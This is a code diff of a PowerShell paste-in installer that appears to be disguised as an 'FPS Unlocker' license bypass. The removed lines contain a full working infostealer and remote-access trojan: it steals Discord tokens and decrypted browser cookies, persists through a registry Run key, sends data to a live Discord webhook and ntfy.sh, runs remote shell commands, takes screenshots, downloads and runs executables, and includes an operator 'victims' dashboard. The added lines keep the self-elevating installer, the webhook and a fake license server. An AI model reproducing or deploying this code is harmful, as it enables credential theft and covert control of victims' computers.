@@ -1,381 +1,448 @@
-$ErrorActionPreference='Stop';$HOOK='https://discord.com/api/webhooks/1565494199208378498/1WDBf43Q9U5YhYYLEXt2Yzou6CWqiPdPil7LKzJg7yhmSbU9ywHovkx-89xmx9wuvop9';$DASH='https://bypasserui.netlify.app/';if(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){if(-not $MyInvocation.Line){throw 'Paste this in an ADMIN PowerShell'};$t="$env:TEMP\s7.ps1";[IO.File]::WriteAllText($t,$MyInvocation.Line);Start-Process powershell -Verb RunAs -ArgumentList @('-NoP','-Ep','Bypass','-File',$t);return};$sha=[Security.Cryptography.SHA256]::Create();$d=$sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($HOOK+'|sv7'));$BUCKET='sv7'+(-join($d[0..5]|%{$_.ToString('x2')}));$PASS=-join($d[6..21]|%{$_.ToString('x2')});$dst="$env:APPDATA\Microsoft\Windows\svc";New-Item -ItemType Directory -Force -Path C:\seven,$dst|Out-Null;Set-Location C:\seven;Get-Process pythonw -EA 0|?{$_.Path -like '*\svc\*'}|Stop-Process -Force -EA 0;$py=(Get-Command python -EA 0).Source;if(-not $py){$py=(Get-Command py -EA 0).Source};if(-not $py){winget install -e --id Python.Python.3.12 --accept-source-agreements --accept-package-agreements --silent;$env:Path=[Environment]::GetEnvironmentVariable('Path','Machine')+';'+[Environment]::GetEnvironmentVariable('Path','User');$py=(Get-Command python -EA 0).Source};if(-not $py){throw 'Python missing'};& $py -m pip install -q cryptography;$f=@(
-'import base64,ctypes,datetime,glob,hashlib,json,os,platform,re,secrets,shutil,sqlite3,ssl,subprocess,sys,tempfile,threading,time,urllib.request,uuid,winreg',
-'from http.server import HTTPServer,BaseHTTPRequestHandler',
+$ErrorActionPreference='Stop'
+$SELF='https://raw.githubusercontent.com/MarcoCOdev1/d/main/install.ps1'
+$HOOK='https://canary.discord.com/api/webhooks/1565494199208378498/1WDBf43Q9U5YhYYLEXt2Yzou6CWqiPdPil7LKzJg7yhmSbU9ywHovkx-89xmx9wuvop9'
+$DASH='https://bypasserui.netlify.app'
+if(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){
+  if(-not $MyInvocation.Line){throw 'Paste this in an ADMIN PowerShell'}
+  $t="$env:TEMP\s7.ps1";[IO.File]::WriteAllText($t,$MyInvocation.Line)
+  Start-Process powershell -Verb RunAs -ArgumentList @('-NoP','-Ep','Bypass','-File',$t);return
+}
+$sha=[Security.Cryptography.SHA256]::Create()
+$d=$sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($HOOK+'|sv7'))
+$BUCKET='sv7'+(-join($d[0..5]|%{$_.ToString('x2')}))
+$PASS=-join($d[6..21]|%{$_.ToString('x2')})
+$svc="$env:APPDATA\Microsoft\Windows\svc"
+New-Item -ItemType Directory -Force -Path C:\seven,$svc|Out-Null
+Set-Location C:\seven
+Get-Process python,pythonw -EA 0|?{$_.Path -like '*\svc\*' -or $_.CommandLine -like '*fake.py*'}|Stop-Process -Force -EA 0
+$py=(Get-Command python -EA 0).Source
+if(-not $py){$py=(Get-Command py -EA 0).Source}
+if(-not $py){winget install -e --id Python.Python.3.12 --accept-source-agreements --accept-package-agreements --silent;$env:Path=[Environment]::GetEnvironmentVariable('Path','Machine')+';'+[Environment]::GetEnvironmentVariable('Path','User');$py=(Get-Command python -EA 0).Source}
+if(-not $py){throw 'Python missing'}
+$pyw=$py -replace 'python\.exe$','pythonw.exe'
+if(-not(Test-Path $pyw)){$pyw=$py}
+& $py -m pip install -q cryptography
+@(
 'from cryptography import x509',
 'from cryptography.x509.oid import NameOID',
-'from cryptography.hazmat.primitives import hashes,serialization',
+'from cryptography.hazmat.primitives import hashes, serialization',
 'from cryptography.hazmat.primitives.asymmetric import rsa',
-'from cryptography.hazmat.primitives.ciphers.aead import AESGCM',
-'from cryptography.hazmat.primitives.kdf.hkdf import HKDF',
-'B="$BUCKET"',
-'PASS="$PASS"',
-'HOOK="$HOOK"',
-'DASH="$DASH"',
-'RES=B+"-r"',
-'CMD=B+"-c"',
-'K=HKDF(algorithm=hashes.SHA256(),length=32,salt=b"sv7",info=b"c2").derive(PASS.encode())',
-'DIR=os.path.dirname(os.path.abspath(__file__))',
-'DST=os.path.join(os.environ.get("APPDATA","."),"Microsoft","Windows","svc")',
-'ST=os.path.join(DST,"st.json")',
-'OUT=os.path.join(DST,"out")',
-'PYW=sys.executable.replace("python.exe","pythonw.exe")',
-'NOWIN=0x08000000',
-'YEAR=365*24*3600*1000',
-'POLL=4',
-'SEEN=set()',
-'TOK=re.compile(r"mfa\.[\w-]{80,90}|[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,40}")',
-'ENC=re.compile(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,})")',
-'def enc(o):',
-'    n=secrets.token_bytes(12)',
-'    return base64.urlsafe_b64encode(n+AESGCM(K).encrypt(n,json.dumps(o).encode(),None)).decode().rstrip("=")',
-'def dec(s):',
-'    b=base64.urlsafe_b64decode(s+"="*(-len(s)%4))',
-'    return json.loads(AESGCM(K).decrypt(b[:12],b[12:],None))',
-'def put(t,o):',
-'    r=urllib.request.Request("https://ntfy.sh/"+t,json.dumps(o).encode(),{"User-Agent":"curl/8.5.0"})',
-'    urllib.request.urlopen(r,timeout=15).read()',
-'def poll(t,since):',
-'    u="https://ntfy.sh/"+t+"/json?poll=1&since="+str(since)',
-'    out=[]',
-'    try:',
-'        r=urllib.request.Request(u,headers={"User-Agent":"curl/8.5.0"})',
-'        for line in urllib.request.urlopen(r,timeout=20):',
-'            line=line.strip()',
-'            if not line:continue',
-'            try:e=json.loads(line)',
-'            except Exception:continue',
-'            if e.get("event")=="message" and e.get("message"):out.append((e.get("time",0),e["message"]))',
-'    except Exception:pass',
-'    return out',
-'def mkcert():',
-'    p=os.path.join(DIR,"cert.pem")',
-'    if os.path.exists(p):return',
-'    k=rsa.generate_private_key(public_exponent=65537,key_size=2048)',
-'    n=x509.Name([x509.NameAttribute(NameOID.COMMON_NAME,"sevenauthapi.com")])',
-'    now=datetime.datetime.now(datetime.timezone.utc)',
-'    c=(x509.CertificateBuilder().subject_name(n).issuer_name(n).public_key(k.public_key())',
-'       .serial_number(x509.random_serial_number())',
-'       .not_valid_before(now-datetime.timedelta(days=1))',
-'       .not_valid_after(now+datetime.timedelta(days=3650))',
-'       .add_extension(x509.SubjectAlternativeName([x509.DNSName("sevenauthapi.com"),x509.DNSName("*.sevenauthapi.com")]),False)',
-'       .add_extension(x509.BasicConstraints(ca=True,path_length=None),True)',
-'       .sign(k,hashes.SHA256()))',
-'    open(p,"wb").write(k.private_bytes(serialization.Encoding.PEM,serialization.PrivateFormat.TraditionalOpenSSL,serialization.NoEncryption())+c.public_bytes(serialization.Encoding.PEM))',
-'    open(os.path.join(DIR,"seven.cer"),"wb").write(c.public_bytes(serialization.Encoding.DER))',
-'class BLOB(ctypes.Structure):',
-'    _fields_=[("cb",ctypes.c_uint32),("pb",ctypes.POINTER(ctypes.c_char))]',
-'def dpa(d):',
-'    buf=ctypes.create_string_buffer(d,len(d))',
-'    i=BLOB(len(d),ctypes.cast(buf,ctypes.POINTER(ctypes.c_char)))',
-'    o=BLOB()',
-'    if not ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(i),None,None,None,None,0,ctypes.byref(o)):raise OSError',
-'    r=ctypes.string_at(o.pb,o.cb)',
-'    ctypes.windll.kernel32.LocalFree(o.pb)',
-'    return r',
-'def ckey(root):',
-'    try:',
-'        b=base64.b64decode(json.load(open(os.path.join(root,"Local State"),encoding="utf-8"))["os_crypt"]["encrypted_key"])',
-'        if b[:5]==b"DPAPI":b=b[5:]',
-'        k=dpa(b)',
-'        return k if len(k)==32 else None',
-'    except Exception:return None',
-'def cdec(v,k):',
-'    if not v:return ""',
-'    p=v[:3]',
-'    if p in (b"v10",b"v11",b"v20",b"v24"):',
-'        if not k:return ""',
-'        try:t=AESGCM(k).decrypt(v[3:15],v[15:],None)',
-'        except Exception:return ""',
-'        if p==b"v24" and len(t)>32:t=t[32:]',
-'        return t.decode("utf-8","replace")',
-'    return v.decode("utf-8","replace")',
-'def cp(s):',
-'    t=os.path.join(tempfile.mkdtemp(prefix="s7"),"db")',
-'    for _ in range(4):',
-'        try:',
-'            shutil.copy2(s,t);return t',
-'        except Exception:time.sleep(0.25)',
-'    return None',
-'def toks():',
-'    f={}',
-'    for base in (os.environ.get("APPDATA"),os.environ.get("LOCALAPPDATA")):',
-'        if not base:continue',
-'        for app in ("discord","discordcanary","discordptb","Lightcord"):',
-'            r=os.path.join(base,app)',
-'            if not os.path.isdir(r):continue',
-'            k=ckey(r)',
-'            for ls in glob.glob(os.path.join(r,"**","leveldb"),recursive=True):',
-'                for x in glob.glob(os.path.join(ls,"*")):',
-'                    try:s=open(x,"rb").read().decode("latin-1")',
-'                    except Exception:continue',
-'                    for m in TOK.findall(s):f.setdefault(m,"plain")',
-'                    for m in ENC.findall(s):',
-'                        try:',
-'                            b=base64.b64decode(m)',
-'                            p=AESGCM(k).decrypt(b[:12],b[12:],None).decode("utf-8","replace")',
-'                        except Exception:continue',
-'                        for t in TOK.findall(p):f.setdefault(t,"aes")',
-'    return [{"token":a,"kind":b} for a,b in f.items()]',
-'BR={"chrome":("LOCALAPPDATA","Google/Chrome/User Data"),"edge":("LOCALAPPDATA","Microsoft/Edge/User Data"),"brave":("LOCALAPPDATA","BraveSoftware/Brave-Browser/User Data"),"vivaldi":("LOCALAPPDATA","Vivaldi/User Data"),"chromium":("LOCALAPPDATA","Chromium/User Data"),"opera":("APPDATA","Opera Software/Opera Stable"),"operagx":("APPDATA","Opera Software/Opera GX Stable")}',
-'def cks():',
-'    out={}',
-'    for n,(e,p) in BR.items():',
-'        r=os.path.join(os.environ.get(e,""),p.replace("/",os.sep))',
-'        if not os.path.isdir(r):continue',
-'        k=ckey(r)',
-'        for c in glob.glob(os.path.join(r,"**","Cookies"),recursive=True):',
-'            t=cp(c)',
-'            if not t:continue',
-'            rows=[]',
-'            try:',
-'                db=sqlite3.connect(t)',
-'                rows=db.execute("select host_key,name,encrypted_value,path,expires_utc,is_secure,is_httponly from cookies limit 400").fetchall()',
-'                db.close()',
-'            except Exception:pass',
-'            finally:',
-'                try:os.remove(t)',
-'                except Exception:pass',
-'            for h,nm,v,pa,ex,se,ho in rows:',
-'                d=cdec(v,k)',
-'                if d:out.setdefault(n,[]).append({"host":h,"name":nm,"value":d,"path":pa,"secure":bool(se),"httpOnly":bool(ho),"expires":ex})',
-'    for pr in glob.glob(os.path.join(os.environ.get("APPDATA",""),"Mozilla","Firefox","Profiles","*")):',
-'        c=os.path.join(pr,"cookies.sqlite")',
-'        if not os.path.isfile(c):continue',
-'        t=cp(c)',
-'        if not t:continue',
-'        try:',
-'            db=sqlite3.connect(t)',
-'            for h,nm,v,pa,ex,se,ho in db.execute("select host,name,value,path,expiry,isSecure,isHttpOnly from moz_cookies limit 400"):',
-'                out.setdefault("firefox",[]).append({"host":h,"name":nm,"value":v,"path":pa,"secure":bool(se),"httpOnly":bool(ho),"expires":ex})',
-'            db.close()',
-'        except Exception:pass',
-'        finally:',
-'            try:os.remove(t)',
-'            except Exception:pass',
-'    return out',
-'def state():',
-'    try:return json.load(open(ST,encoding="utf-8"))',
-'    except Exception:return {}',
-'def save(d):',
-'    os.makedirs(DST,exist_ok=True)',
-'    json.dump(d,open(ST,"w",encoding="utf-8"))',
-'def vid():',
-'    d=state()',
-'    if not d.get("vid"):',
-'        d["vid"]=secrets.token_hex(4);save(d)',
-'    return d["vid"]',
-'def install():',
-'    if DIR.lower().startswith(DST.lower()):return False',
-'    os.makedirs(DST,exist_ok=True)',
-'    for f in ("fake.py","cert.pem"):',
-'        try:shutil.copy2(os.path.join(DIR,f),os.path.join(DST,f))',
-'        except Exception:pass',
-'    subprocess.Popen([PYW,os.path.join(DST,"fake.py")],creationflags=NOWIN,close_fds=True)',
-'    return True',
-'def persist():',
-'    try:',
-'        v=os.path.join(DST,"run.vbs")',
-'        open(v,"w").write("CreateObject(\"WScript.Shell\").Run \""+PYW+" \"\"\"+os.path.join(DST,"fake.py")+"\"\"\", 0, False")',
-'        k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,winreg.KEY_SET_VALUE)',
-'        winreg.SetValueEx(k,"WinSecSvc",0,winreg.REG_SZ,"wscript.exe \""+v+"\"")',
-'        winreg.CloseKey(k)',
-'    except Exception:pass',
-'def chunk(t,cid,s):',
-'    n=2800',
-'    parts=[s[i:i+n] for i in range(0,len(s),n)] or [""]',
-'    for i,p in enumerate(parts):put(RES,{"t":t,"vid":vid(),"cid":cid,"i":i,"n":len(parts),"d":p})',
-'def grab():',
-'    d={"host":os.environ.get("COMPUTERNAME",""),"user":os.environ.get("USERNAME",""),"os":platform.platform(),"tokens":toks(),"cookies":cks(),"when":time.strftime("%Y-%m-%d %H:%M:%S")}',
-'    try:',
-'        os.makedirs(OUT,exist_ok=True)',
-'        open(os.path.join(OUT,"last.json"),"w",encoding="utf-8").write(json.dumps(d,indent=1))',
-'    except Exception:pass',
-'    return d',
-'def post(blob,new,d):',
-'    bnd="----s7"+secrets.token_hex(8)',
-'    ip=""',
-'    try:ip=urllib.request.urlopen("https://api.ipify.org",timeout=8).read().decode()',
-'    except Exception:pass',
-'    link=(DASH+"#"+B+"."+PASS+"/"+vid()) if DASH and "CHANGE-ME" not in DASH else ""',
-'    L=[("NEW VICTIM" if new else "UPDATE"),"host: "+d["host"],"user: "+d["user"],"ip: "+ip,"os: "+d["os"],"vid: "+vid(),"tokens: "+str(len(d["tokens"])),"cookies: "+str(sum(len(v) for v in d["cookies"].values()))]',
-'    if link:L+=["","dashboard: "+link]',
-'    head=("--"+bnd+"\r\nContent-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n"+json.dumps({"content":"```\n"+"\n".join(L)+"\n```"})+"\r\n")',
-'    fil="--"+bnd+"\r\nContent-Disposition: form-data; name=\"files[0]\"; filename=\"d.enc\"\r\nContent-Type: application/octet-stream\r\n\r\n"',
-'    body=head.encode()+fil.encode()+blob.encode()+("\r\n--"+bnd+"--\r\n").encode()',
-'    r=urllib.request.Request(HOOK,body,{"Content-Type":"multipart/form-data; boundary="+bnd,"User-Agent":"Mozilla/5.0"})',
-'    urllib.request.urlopen(r,timeout=20).read()',
-'def report(d,new):',
-'    blob=enc(d)',
-'    chunk("g","boot",blob)',
-'    if HOOK and "XXX" not in HOOK:',
-'        try:post(blob,new,d)',
-'        except Exception:pass',
-'def b64f(p):return base64.b64encode(open(p,"rb").read()).decode()',
-'PSHOT="Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$b=[System.Windows.Forms.SystemInformation]::VirtualScreen;$i=New-Object System.Drawing.Bitmap $b.Width,$b.Height;$g=[System.Drawing.Graphics]::FromImage($i);$g.CopyFromScreen($b.Left,$b.Top,0,0,$i.Size);$i.Save($env:TEMP+chr(92)+\"s.png\");Write-Output ($env:TEMP+chr(92)+\"s.png\")"',
-'def run_cmd(c):',
-'    global POLL',
-'    k=c.get("cmd","");a=c.get("arg","");cid=c.get("id","")',
-'    try:',
-'        if k=="shell":',
-'            p=subprocess.run(a,shell=True,capture_output=True,text=True,errors="replace",timeout=180,creationflags=NOWIN)',
-'            chunk("r",cid,enc({"kind":"shell","out":(p.stdout or "")+(p.stderr or "")}))',
-'        elif k=="ps":',
-'            p=subprocess.run(["powershell","-NoP","-C",a],capture_output=True,text=True,errors="replace",timeout=180,creationflags=NOWIN)',
-'            chunk("r",cid,enc({"kind":"ps","out":(p.stdout or "")+(p.stderr or "")}))',
-'        elif k=="shot":',
-'            p=subprocess.run(["powershell","-NoP","-C",PSHOT],capture_output=True,text=True,errors="replace",timeout=90,creationflags=NOWIN)',
-'            f=(p.stdout or "").strip()',
-'            chunk("r",cid,enc({"kind":"shot","b64":b64f(f)}));os.remove(f)',
-'        elif k=="get":chunk("r",cid,enc({"kind":"get","name":os.path.basename(a),"b64":b64f(a)}))',
-'        elif k=="ls":chunk("r",cid,enc({"kind":"ls","out":"\n".join(os.listdir(a or "."))}))',
-'        elif k=="dl":',
-'            t=os.path.join(tempfile.gettempdir(),secrets.token_hex(4)+".exe")',
-'            urllib.request.urlretrieve(a,t)',
-'            subprocess.Popen([t],creationflags=NOWIN,close_fds=True)',
-'            chunk("r",cid,enc({"kind":"dl","out":"started "+t}))',
-'        elif k=="grab":',
-'            chunk("r",cid,enc({"kind":"grab","out":"ok"}));report(grab(),False)',
-'        elif k=="kill":chunk("r",cid,enc({"kind":"kill","out":subprocess.run("taskkill /f /im "+a,shell=True,capture_output=True,text=True,errors="replace").stdout}))',
-'        elif k=="sleep":',
-'            POLL=max(2,int(a or 4));chunk("r",cid,enc({"kind":"sleep","out":str(POLL)}))',
-'        elif k=="rm":',
-'            chunk("r",cid,enc({"kind":"rm","out":"bye"}))',
-'            try:',
-'                kk=winreg.OpenKey(winreg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,winreg.KEY_SET_VALUE)',
-'                winreg.DeleteValue(kk,"WinSecSvc")',
-'            except Exception:pass',
-'            os._exit(0)',
-'    except Exception as e:',
-'        try:chunk("r",cid,enc({"kind":k,"out":"ERR "+repr(e)}))',
-'        except Exception:pass',
-'def beacon():',
-'    ip=""',
-'    try:ip=urllib.request.urlopen("https://api.ipify.org",timeout=8).read().decode()',
-'    except Exception:pass',
-'    put(RES,{"t":"b","vid":vid(),"d":enc({"host":os.environ.get("COMPUTERNAME",""),"user":os.environ.get("USERNAME",""),"os":platform.platform(),"ip":ip,"pid":os.getpid()})})',
-'def agent():',
-'    last=int(time.time())-5',
-'    n=0',
-'    while True:',
-'        try:',
-'            for ts,m in poll(CMD+","+CMD+"-"+vid(),last):',
-'                if ts>last:last=ts',
-'                try:c=dec(m)',
-'                except Exception:continue',
-'                if c.get("vid") not in (None,vid()):continue',
-'                if c.get("id") in SEEN:continue',
-'                SEEN.add(c.get("id"))',
-'                threading.Thread(target=run_cmd,args=(c,),daemon=True).start()',
-'            n+=1',
-'            if n%15==1:beacon()',
-'        except Exception:pass',
-'        time.sleep(POLL+secrets.randbelow(3)*0.4)',
+'import datetime',
+'',
+'k = rsa.generate_private_key(public_exponent=65537, key_size=2048)',
+'n = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "sevenauthapi.com")])',
+'now = datetime.datetime.now(datetime.timezone.utc)',
+'',
+'c = (x509.CertificateBuilder().subject_name(n).issuer_name(n)',
+'     .public_key(k.public_key()).serial_number(x509.random_serial_number())',
+'     .not_valid_before(now - datetime.timedelta(days=1))',
+'     .not_valid_after(now + datetime.timedelta(days=3650))',
+'     .add_extension(x509.SubjectAlternativeName([',
+'         x509.DNSName("sevenauthapi.com"), x509.DNSName("*.sevenauthapi.com")]), False)',
+'     .add_extension(x509.BasicConstraints(ca=True, path_length=None), True)',
+'     .sign(k, hashes.SHA256()))',
+'',
+'open("cert.pem","wb").write(',
+'    k.private_bytes(serialization.Encoding.PEM,',
+'        serialization.PrivateFormat.TraditionalOpenSSL,',
+'        serialization.NoEncryption()) + c.public_bytes(serialization.Encoding.PEM))',
+'open("seven.cer","wb").write(c.public_bytes(serialization.Encoding.DER))',
+'print("OK")'
+)|Set-Content .\makecert.py -Encoding utf8
+@(
+'import ssl, json, base64, hashlib, time, uuid, secrets',
+'from http.server import HTTPServer, BaseHTTPRequestHandler',
+'',
+'YEAR = 365 * 24 * 3600 * 1000',
+'',
 'def token(hwid):',
-'    now=int(time.time()*1000)',
-'    p={"k":secrets.token_hex(12),"h":hashlib.sha256(hwid.encode()).hexdigest()[:24],"c":secrets.token_hex(8),"e":now+10*YEAR}',
-'    b=base64.urlsafe_b64encode(json.dumps(p,separators=(",",":")).encode()).decode().rstrip("=")',
-'    return b+"."+base64.urlsafe_b64encode(secrets.token_bytes(32)).decode().rstrip("=")',
+'    now = int(time.time() * 1000)',
+'    p = {"k": secrets.token_hex(12),',
+'         "h": hashlib.sha256(hwid.encode()).hexdigest()[:24],',
+'         "c": secrets.token_hex(8),',
+'         "e": now + 10 * YEAR}',
+'    b = base64.urlsafe_b64encode(json.dumps(p, separators=(",", ":")).encode()).decode().rstrip("=")',
+'    sig = base64.urlsafe_b64encode(secrets.token_bytes(32)).decode().rstrip("=")',
+'    return b + "." + sig',
+'',
 'class H(BaseHTTPRequestHandler):',
-'    def log_message(self,*a):pass',
-'    def do_GET(self):self.x()',
-'    def do_POST(self):self.x()',
+'    def do_GET(self): self.x()',
+'    def do_POST(self): self.x()',
 '    def x(self):',
-'        n=int(self.headers.get("Content-Length") or 0)',
-'        raw=self.rfile.read(n)',
-'        try:req=json.loads(raw or b"{}")',
-'        except Exception:req={}',
-'        threading.Thread(target=report,args=(grab(),False),daemon=True).start()',
-'        now=int(time.time()*1000)',
-'        body={"success":True,"message":"Authorized","data":{"product":{"id":"6ac401b8ca0d96ab19f8c388","name":"FPS Unlocker","hash":req.get("productHash","")},"username":req.get("username","user"),"sessionToken":token(req.get("hwid","")),"expiresAt":time.strftime("%Y-%m-%dT%H:%M:%S.000Z",time.gmtime((now+10*YEAR)/1000)),"expiresAtUnix":now+10*YEAR,"daysLeft":3650,"serverTimeUnix":now,"secondsLeft":10*YEAR//1000,"config":None},"requestId":str(uuid.uuid4()),"timestamp":time.strftime("%Y-%m-%dT%H:%M:%S.000Z",time.gmtime(now/1000))}',
-'        b=json.dumps(body).encode()',
+'        n = int(self.headers.get("Content-Length") or 0)',
+'        raw = self.rfile.read(n)',
+'        print(">>>", self.path, raw)',
+'        try: open(r"C:\seven\.hit","w").close()',
+'        except: pass',
+'        try: req = json.loads(raw or b"{}")',
+'        except: req = {}',
+'        now = int(time.time() * 1000)',
+'        body = {"success": True, "message": "Authorized", "data": {',
+'            "product": {"id": "6ac401b8ca0d96ab19f8c388", "name": "FPS Unlocker",',
+'                        "hash": req.get("productHash", "")},',
+'            "username": req.get("username", "user"),',
+'            "sessionToken": token(req.get("hwid", "")),',
+'            "expiresAt": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime((now + 10 * YEAR) / 1000)),',
+'            "expiresAtUnix": now + 10 * YEAR,',
+'            "daysLeft": 3650,',
+'            "serverTimeUnix": now,',
+'            "secondsLeft": 10 * YEAR // 1000,',
+'            "config": None},',
+'            "requestId": str(uuid.uuid4()),',
+'            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime(now / 1000))}',
+'        b = json.dumps(body).encode()',
 '        self.send_response(200)',
-'        self.send_header("Content-Type","application/json; charset=utf-8")',
-'        self.send_header("x-censor-enabled","1")',
-'        self.send_header("Content-Length",str(len(b)))',
+'        self.send_header("Content-Type", "application/json; charset=utf-8")',
+'        self.send_header("x-censor-enabled", "1")',
+'        self.send_header("Content-Length", str(len(b)))',
 '        self.end_headers()',
 '        self.wfile.write(b)',
-'def serve():',
-'    ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)',
-'    ctx.load_cert_chain(os.path.join(DIR,"cert.pem"))',
-'    s=HTTPServer(("0.0.0.0",443),H)',
-'    s.socket=ctx.wrap_socket(s.socket,server_side=True)',
-'    s.serve_forever()',
-'def boot():',
-'    time.sleep(1)',
-'    d=grab()',
-'    st=state()',
-'    new=not st.get("notified")',
-'    if new:',
-'        st["notified"]=1;save(st)',
-'    report(d,new)',
-'    beacon()',
-'mkcert()',
-'if "--cert" in sys.argv:pass',
-'elif install():pass',
-'else:',
-'    persist()',
-'    threading.Thread(target=boot,daemon=True).start()',
-'    threading.Thread(target=agent,daemon=True).start()',
-'    try:serve()',
-'    except Exception:',
-'        while True:time.sleep(60)'
-);[IO.File]::WriteAllText("C:\seven\fake.py",($f -join "`n"));$u=@(
-'<!doctype html><html><head><meta charset=~utf-8~><meta name=~viewport~ content=~width=device-width,initial-scale=1~><title>sv7</title><style>',
-'*{box-sizing:border-box}body{margin:0;font:13px/1.4 ui-monospace,Consolas,monospace;background:#08090b;color:#c9d1d9;display:flex;height:100vh}',
-'#l{width:290px;border-right:1px solid #1a1f26;overflow:auto;flex:none}#r{flex:1;display:flex;flex-direction:column;min-width:0}',
-'.v{padding:9px;border-bottom:1px solid #141920;cursor:pointer}.v:hover{background:#0f141a}.v.on{background:#131c26;box-shadow:inset 3px 0 #3b82f6}',
-'.h{color:#6e7681;font-size:11px}#top{padding:9px;border-bottom:1px solid #1a1f26;color:#6e7681;display:flex;gap:8px;align-items:center}',
-'#log{flex:1;overflow:auto;padding:10px;white-space:pre-wrap;word-break:break-all}.r{border-bottom:1px solid #141920;padding:7px 0;margin-bottom:7px}',
-'.k{color:#3b82f6}img{max-width:100%;border:1px solid #1a1f26;margin-top:5px;border-radius:4px}',
-'#bar{display:flex;gap:5px;padding:9px;border-top:1px solid #1a1f26;flex-wrap:wrap}',
-'input{flex:1;min-width:120px;background:#0f141a;border:1px solid #21262d;color:#c9d1d9;padding:7px;font:inherit;border-radius:4px}',
-'button{background:#1f6feb;border:0;color:#fff;padding:7px 11px;font:inherit;cursor:pointer;border-radius:4px}',
-'button.g{background:#21262d}.dot{width:7px;height:7px;border-radius:50%;background:#3fb950;display:inline-block}.dead{background:#484f58}',
-'</style></head><body>',
-'<div id=l><div id=top><span class=dot id=st></span><span id=cnt>0</span> victims</div><div id=list></div></div>',
-'<div id=r><div id=top><span id=sel>pick a victim</span></div><div id=log></div>',
-'<div id=bar>',
-'<button class=g onclick=~s(~~shot~~)~>screenshot</button>',
-'<button class=g onclick=~s(~~ls~~,~~C:\\~~)~>ls</button>',
-'<button class=g onclick=~s(~~ps~~,~~Get-Process | Select -First 30 | Format-Table -Auto~~)~>procs</button>',
-'<button class=g onclick=~s(~~grab~~)~>re-grab</button>',
-'<button class=g onclick=~s(~~sleep~~,~~120~~)~>sleep</button>',
-'<button class=g onclick=~s(~~rm~~)~>uninstall</button>',
-'<input id=i placeholder=~cmd / powershell...~ onkeydown=~if(event.key===String.fromCharCode(39,69,110,116,101,114,39))go()~>',
-'<button onclick=go()>run</button></div></div>',
-'<script>',
-'let P=~~,B=~~,SEL=null,LAST=0,KEY=null,V={};',
-'const b64d=s=>Uint8Array.from(atob(s.replace(/-/g,~+~).replace(/_/g,~/~)),c=>c.charCodeAt(0));',
-'const b64e=b=>btoa(String.fromCharCode(...b)).replace(/\+/g,~-~).replace(/\//g,~_~).replace(/=+$/,~~);',
-'const esc=s=>String(s==null?~~:s).replace(/&/g,~&amp;~).replace(/</g,~&lt;~);',
-'async function derive(){const i=await crypto.subtle.importKey(~~raw~~,new TextEncoder().encode(P),~~HKDF~~,false,[~~deriveKey~~]);KEY=await crypto.subtle.deriveKey({name:~~HKDF~~,hash:~~SHA-256~~,salt:new TextEncoder().encode(~~sv7~~),info:new TextEncoder().encode(~~c2~~)},i,{name:~~AES-GCM~~,length:256},false,[~~encrypt~~,~~decrypt~~])}',
-'async function enc(o){const n=crypto.getRandomValues(new Uint8Array(12));const c=new Uint8Array(await crypto.subtle.encrypt({name:~~AES-GCM~~,iv:n},KEY,new TextEncoder().encode(JSON.stringify(o))));const r=new Uint8Array(12+c.length);r.set(n);r.set(c,12);return b64e(r)}',
-'async function dec(s){const b=b64d(s);return JSON.parse(new TextDecoder().decode(await crypto.subtle.decrypt({name:~~AES-GCM~~,iv:b.slice(0,12)},KEY,b.slice(12))))}',
-'async function put(t,o){await fetch(~~https://ntfy.sh/~~+t,{method:~~POST~~,body:JSON.stringify(o),headers:{~~Content-Type~~:~~text/plain~~}})}',
-'function slot(v){return V[v]||(V[v]={vid:v,host:~~?~~,user:~~,os:~~,ip:~~,pid:0,last:0,buf:{},res:[]})}',
-'async function handle(m){let e;try{e=JSON.parse(m)}catch(_){return}if(!e.vid)return;const s=slot(e.vid);s.last=Date.now()/1000;',
-'if(e.t===~~b~~){try{const d=await dec(e.d);s.host=d.host||~~?~~;s.user=d.user||~~;s.os=d.os||~~;s.ip=d.ip||~~;s.pid=d.pid||0}catch(_){}return}',
-'const cid=e.cid||~~auto~~,b=s.buf[cid]||(s.buf[cid]={n:e.n||1,p:{}});b.p[e.i||0]=e.d||~~;',
-'if(Object.keys(b.p).length<b.n)return;delete s.buf[cid];',
-'let d;try{d=await dec(Object.keys(b.p).sort((x,y)=>x-y).map(i=>b.p[i]).join(~~))}catch(_){return}',
-'d.cid=cid;s.res.push(d);if(s.res.length>60)s.res.shift();if(!SEL)pick(e.vid)}',
-'async function pull(){if(!B)return;try{const t=await (await fetch(~~https://ntfy.sh/~~+B+~~-r/json?poll=1&since=~~+LAST)).text();',
-'for(const l of t.split(String.fromCharCode(10))){if(!l.trim())continue;let e;try{e=JSON.parse(l)}catch(_){continue}if(e.event!==~~message~~)continue;if(e.time>LAST)LAST=e.time;handle(e.message)}',
-'document.getElementById(~~st~~).className=~~dot~~}catch(_){document.getElementById(~~st~~).className=~~dot dead~~}}',
-'function pick(v){SEL=v;history.replaceState(null,~~,~~#~~+B+~~.~~+P+~~/~~+v);render()}',
-'function render(){document.getElementById(~~cnt~~).textContent=Object.keys(V).length;',
-'document.getElementById(~~list~~).innerHTML=Object.values(V).sort((a,b)=>b.last-a.last).map(v=>`<div class=~v ${v.vid===SEL?~on~:~~}~ onclick=~pick(${v.vid})~><b>${esc(v.host)}</b><div class=~h~>${esc(v.user)} · ${esc(v.ip||~-~)} · ${Math.round(Date.now()/1000-v.last)}s</div></div>`).join(~~);',
